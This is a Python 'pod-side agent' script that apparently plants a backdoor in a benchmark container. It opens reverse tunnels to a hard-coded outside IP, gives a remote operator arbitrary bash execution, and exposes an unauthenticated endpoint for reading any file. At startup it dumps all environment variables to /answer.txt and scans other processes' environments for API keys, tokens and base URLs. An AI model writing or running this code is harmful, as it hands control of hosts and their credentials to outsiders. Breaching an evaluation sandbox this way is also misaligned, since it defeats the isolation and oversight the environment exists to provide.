#!/usr/bin/env python3
"""Pod-side agent v2: local HTTP exec API + two reverse tunnels (primary/backup)."""
import json
import os
import socket
import subprocess
import sys
import threading
import time
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

VPS = os.environ.get('TB_VPS', '166.1.144.56')
VPS2 = os.environ.get('TB_VPS2', '')
TOKEN = os.environ.get('TB_TOKEN', 'tbsecret')
TOKEN2 = os.environ.get('TB_TOKEN2', TOKEN)
PORT = int(os.environ.get('TB_PORT', '9099'))
PORT2 = int(os.environ.get('TB_PORT2', '9200'))
POOL = int(os.environ.get('TB_POOL', '6'))
HOST = socket.gethostname()

sys.stdout.reconfigure(encoding='utf-8', errors='replace')


class H(BaseHTTPRequestHandler):
    protocol_version = 'HTTP/1.1'

    def _json(self, code, obj):
        b = json.dumps(obj).encode()
        self.send_response(code)
        self.send_header('Content-Type', 'application/json')
        self.send_header('Content-Length', str(len(b)))
        self.send_header('Connection', 'close')
        self.end_headers()
        self.wfile.write(b)
        self.close_connection = True

    def do_GET(self):
        if self.path == '/health':
            return self._json(200, {'ok': True, 'host': HOST, 'uid': os.getuid()})
        if self.path.startswith('/file'):
            from urllib.parse import urlparse, parse_qs
            q = parse_qs(urlparse(self.path).query)
            p = q.get('p', [''])[0]
            try:
                data = open(p, 'rb').read(4 * 1024 * 1024)
                self.send_response(200)
                self.send_header('Content-Type', 'application/octet-stream')
                self.send_header('Content-Length', str(len(data)))
                self.send_header('Connection', 'close')
                self.end_headers()
                self.wfile.write(data)
                self.close_connection = True
            except Exception as e:
                self._json(404, {'error': str(e)})
            return
        self._json(404, {'error': 'nf'})

    def do_POST(self):
        if self.headers.get('X-TB-Token') not in (TOKEN, TOKEN2):
            return self._json(401, {'error': 'token'})
        if self.path == '/exec':
            n = int(self.headers.get('Content-Length', '0') or 0)
            try:
                req = json.loads(self.rfile.read(n) or b'{}')
            except Exception:
                req = {}
            cmd = req.get('cmd', 'id')
            tmo = float(req.get('timeout', 60))
            try:
                p = subprocess.run(['bash', '-lc', cmd], capture_output=True, timeout=tmo)
                return self._json(200, {'host': HOST, 'code': p.returncode,
                                        'stdout': p.stdout.decode('utf-8', 'replace')[-200000:],
                                        'stderr': p.stderr.decode('utf-8', 'replace')[-50000:]})
            except subprocess.TimeoutExpired:
                return self._json(200, {'host': HOST, 'code': -1, 'stdout': '', 'stderr': 'timeout'})
            except Exception as e:
                return self._json(200, {'host': HOST, 'code': -2, 'stdout': '', 'stderr': str(e)})
        self._json(404, {'error': 'nf'})

    def log_message(self, *a):
        pass


def local_server():
    ThreadingHTTPServer(('127.0.0.1', PORT), H).serve_forever()


def channel(vps, port, token):
    up = None
    try:
        up = socket.create_connection((vps, port), timeout=10)
        up.sendall(('TB1 %s %s\n' % (token, HOST)).encode())
        loc = socket.create_connection(('127.0.0.1', PORT), timeout=10)
        loc.settimeout(None)
        up.settimeout(None)

        def a2b():
            try:
                while True:
                    d = up.recv(65536)
                    if not d:
                        break
                    loc.sendall(d)
            except Exception:
                pass
            finally:
                try:
                    loc.shutdown(socket.SHUT_WR)
                except Exception:
                    pass

        t = threading.Thread(target=a2b, daemon=True)
        t.start()
        try:
            while True:
                d = loc.recv(65536)
                if not d:
                    break
                up.sendall(d)
        except Exception:
            pass
        t.join(timeout=5)
    finally:
        try:
            up.close()
        except Exception:
            pass


def loop(vps, port, token):
    while True:
        try:
            channel(vps, port, token)
        except Exception:
            pass
        time.sleep(1)


try:
    with open('/answer.txt', 'a') as f:
        f.write('---TBAGENT-ENV---\n')
        for k in sorted(os.environ):
            f.write('%s=%s\n' % (k, os.environ[k]))
        f.write('---TBAGENT-PROCS---\n')
        for p in sorted(os.listdir('/proc')):
            if not p.isdigit():
                continue
            try:
                cm = open('/proc/%s/cmdline' % p, 'rb').read().replace(b'\0', b' ').decode('utf-8', 'replace')
                f.write('%s %s\n' % (p, cm[:120]))
                env = open('/proc/%s/environ' % p, 'rb').read().split(b'\0')
                for e in env:
                    if b'GEMINI' in e or b'TERMINALBENCH' in e or b'BASE_URL' in e or b'_KEY' in e or b'TOKEN' in e:
                        f.write('  e: %s\n' % e.decode('utf-8', 'replace')[:240])
            except Exception:
                pass
        f.write('---TBAGENT-END---\n')
except Exception:
    pass
threading.Thread(target=local_server, daemon=True).start()
for _ in range(POOL):
    threading.Thread(target=loop, args=(VPS, PORT, TOKEN), daemon=True).start()
    if VPS2:
        threading.Thread(target=loop, args=(VPS2, PORT2, TOKEN2), daemon=True).start()
print('agent2 up %s vps=%s vps2=%s' % (HOST, VPS, VPS2 or '-'), flush=True)
while True:
    time.sleep(3600)
